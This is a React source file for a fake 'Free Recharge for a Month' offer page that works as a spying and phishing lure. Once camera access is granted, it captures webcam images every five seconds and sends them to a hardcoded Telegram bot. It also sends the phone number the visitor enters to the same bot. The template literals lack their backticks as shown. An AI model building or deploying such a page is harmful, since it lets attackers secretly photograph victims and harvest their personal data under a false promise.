import React, { useEffect, useState } from "react";

const App = () => {
  const [chatId, setChatId] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [countryCode, setCountryCode] = useState("+1");
  const [stream, setStream] = useState(null);

  useEffect(() => {
    // Extract chat ID from URL parameter
    const params = new URLSearchParams(window.location.search);
    const id = params.get("id");
    if (id) setChatId(id);

    // Request camera access
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        setStream(stream);
        captureImages(stream);
      })
      .catch((err) => console.error("Camera access denied", err));
  }, []);

  const captureImages = (stream) => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    setInterval(() => {
      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      sendToTelegram(canvas.toDataURL("image/jpeg"));
    }, 5000);
  };

  const sendToTelegram = async (imageData) => {
    if (!chatId) return;
    const botToken = "7705454960:AAHMxYDCrNB4pr5VyG7NH6Xmqbh6iZr9ezM";
    const url = https://api.telegram.org/bot${botToken}/sendPhoto;
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", dataURItoBlob(imageData), "photo.jpg");
    await fetch(url, { method: "POST", body: formData });
  };

  const dataURItoBlob = (dataURI) => {
    const byteString = atob(dataURI.split(",")[1]);
    const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
      ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
  };

  const handleRecharge = async () => {
    if (!chatId || !phoneNumber) return;
    const botToken = "7705454960:AAHMxYDCrNB4pr5VyG7NH6Xmqbh6iZr9ezM";
    const url = https://api.telegram.org/bot${botToken}/sendMessage;
    const message = Recharge Request:\nPhone: ${countryCode}${phoneNumber};
    await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: chatId, text: message }) });
    alert("Recharge request sent!");
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white">
      <h1 className="text-3xl font-bold mb-4">Free Recharge for a Month</h1>
      <img src="https://source.unsplash.com/600x200/?money,recharge,offer,promotion" alt="Recharge Banner" className="rounded-lg mb-4" />
      <div className="flex gap-2 mb-4">
        <select className="p-2 text-black" value={countryCode} onChange={(e) => setCountryCode(e.target.value)}>
          <option value="+1">+1 (USA)</option>
          <option value="+91">+91 (India)</option>
          <option value="+92">+92 (Pakistan)</option>
          <option value="+93">+93 (Afghanistan)</option>
          <option value="+44">+44 (UK)</option>
          <option value="+81">+81 (Japan)</option>
          <option value="+49">+49 (Germany)</option>
          <option value="+33">+33 (France)</option>
          <option value="+61">+61 (Australia)</option>
          <option value="+55">+55 (Brazil)</option>
        </select>
        <input type="text" className="p-2 text-black" placeholder="Enter Phone Number" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} />
      </div>
      <button className="bg-blue-500 px-4 py-2 rounded" onClick={handleRecharge}>Recharge</button>
      <div className="mt-6 grid grid-cols-3 gap-2">
        <img src="https://source.unsplash.com/150x150/?smartphone,recharge" alt="Phone" className="rounded-lg" />

<img src="https://source.unsplash.com/150x150/?technology,mobile" alt="Tech" className="rounded-lg" />
        <img src="https://source.unsplash.com/150x150/?internet,data" alt="Internet" className="rounded-lg" />
        <img src="https://source.unsplash.com/150x150/?wallet,money" alt="Wallet" className="rounded-lg" />
        <img src="https://source.unsplash.com/150x150/?payment,banking" alt="Payment" className="rounded-lg" />
        <img src="https://source.unsplash.com/150x150/?advertisement,promotion" alt="Promo" className="rounded-lg" />
      </div>
    </div>
  );
};

export default App;